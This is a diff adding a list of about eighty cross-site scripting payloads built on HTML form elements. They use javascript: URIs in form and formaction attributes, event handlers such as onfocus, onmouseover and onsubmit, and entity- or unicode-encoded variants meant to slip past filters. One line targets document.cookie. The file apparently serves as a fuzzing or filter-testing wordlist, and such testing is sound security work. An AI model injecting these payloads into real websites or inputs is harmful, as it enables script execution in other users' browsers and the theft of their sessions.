@@ -1,0 +1,81 @@
+<form action=javascript:alert(1)><input type=submit> 
+<form action=javascript:alert(203)><input type=submit>
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<form><a href="javascript:\u0061lert(1)">X
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+<form><button formaction="javascript:alert(1)">
+<form><button formaction="javascript:alert(123)">crosssitespt
+<form><button formaction=javascript:alert(1)>click 
+<form><button formaction=javascript:alert(206)>click
+<form><button formaction="javascript:alert(866)">lol
+<form><button formaction="javascript:alert(959)">crosssitespt
+<form><button formaction="javascript:alert(XSS)">lol
+<form><button formaction=javascript&colon;alert(1176)>CLICKME
+<form><button formaction=javascript&colon;alert(1711)>CLICKME
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<form><button formaction=javascript&colon;alert(799)>CLICKME
+<form><button formaction=javascript&colon;alert(838)>CLICKME
+<form><button formaction="javascript:javascript:alert(1484)">X
+<form><button formaction="javascript:javascript:alert(1)">X
+<form><button formaction="javascript:javascript:alert(570)">X
+</form>//["'`-->]]>]</div>
+<form draggable="true" ondrag="alert(1)">test</form>
+<form draggable="true" ondragend="alert(1)">test</form>
+<form draggable="true" ondragenter="alert(1)">test</form>
+<form draggable="true" ondragleave="alert(1)">test</form>
+<form draggable="true" ondragstart="alert(1)">test</form>
+<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+<form id="test" /><button form="test" formaction="javascript:alert(958)">TESTHTML5FORMACTION
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(1609)">X
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(695)">X
+<form id=test onforminput=javascript:alert(1481)><input></form><button form=test onformchange=javascript:alert(1481)>X
+<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
+<form id=test onforminput=javascript:alert(567)><input></form><button form=test onformchange=javascript:alert(567)>X
+<form id=x tabindex=1 onactivate=alert(1)></form>
+<form id=x tabindex=1 onbeforeactivate=alert(1)></form>
+<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>
+<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>
+<form id=x tabindex=1 onfocus=alert(1)></form>
+<form id=x tabindex=1 onfocusin=alert(1)></form>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+<form><iframe &#09;&#11500;&#11501150; src="javascript&#58;alert(1150)"&#11501150;&#11500;&#09;;>
+<form><iframe &#09;&#16870;&#16871687; src="javascript&#58;alert(1687)"&#16871687;&#16870;&#09;;>
+<form><iframe &#09;&#7730;&#773773; src="javascript&#58;alert(773)"&#773773;&#7730;&#09;;>
+<form><iframe &#09;&#8120;&#812812; src="javascript&#58;alert(812)"&#812812;&#8120;&#09;;>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
+<form><input formaction=javascript:alert(1) type=image value=click> 
+<form><input formaction=javascript:alert(1) type=submit value=click> 
+<form><input formaction=javascript:alert(207) type=submit value=click>
+<form><input formaction=javascript:alert(208) type=image value=click>
+<form><input formaction=javascript:alert(209) type=image src=http://brutelogic.com.br/webgun/img/youtube209.jpg>
+<form><input oninvalid=alert(1) required><input type=submit>
+<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
+<form><isindex formaction="javascript&colon;confirm(1)"
+<form onbeforecopy="alert(1)" contenteditable>test</form>
+<form onbeforecut="alert(1)" contenteditable>test</form>
+<form onbeforepaste="alert(1)" contenteditable>test</form>
+<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>
+<form onclick="alert(1)">test</form>
+<form oncontextmenu="alert(1)">test</form>
+<form oncopy="alert(1)" contenteditable>test</form>
+<form oncut="alert(1)" contenteditable>test</form>
+<form ondblclick="alert(1)">test</form>
+<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>
+<form onkeydown="alert(1)" contenteditable>test</form>
+<form onkeypress="alert(1)" contenteditable>test</form>
+<form onkeyup="alert(1)" contenteditable>test</form>
+<form onmousedown="alert(1)">test</form>
+<form onmouseenter="alert(1)">test</form>
+<form onmouseleave="alert(1)">test</form>
+<form onmousemove="alert(1)">test</form>
+<form onmouseout="alert(1)">test</form>
+<form onmouseover="alert(1)">test</form>
+<form onmouseup="alert(1)">test</form>
+<form onpaste="alert(1)" contenteditable>test</form>
+<form onreset=alert(1)><input type=reset>
+<form onsubmit=alert(152)><input type=submit>
+<form onsubmit=alert(1)><input type=submit>
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<form><textarea oninvalid=alert(1) required><input type=submit>
